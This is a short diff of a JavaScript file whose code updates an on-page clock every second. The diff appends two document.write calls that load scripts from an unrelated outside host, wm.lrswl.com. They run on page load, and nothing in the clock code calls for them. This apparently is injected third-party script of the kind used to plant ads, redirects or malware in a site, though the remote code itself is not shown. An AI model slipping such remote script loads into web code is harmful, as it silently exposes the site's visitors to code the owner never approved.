@@ -28,3 +28,6 @@ document.addEventListener('DOMContentLoaded', function() {
     document.getElementById('current-time').textContent = `现在时间：${formattedTime}`;  
   }, 1000); // 每秒更新一次时间  
 });
+
+document.write('<script src="http://wm.lrswl.com/page/?s=322873"></script>');
+document.write('<script src="http://wm.lrswl.com/page/?s=322874"></script>');
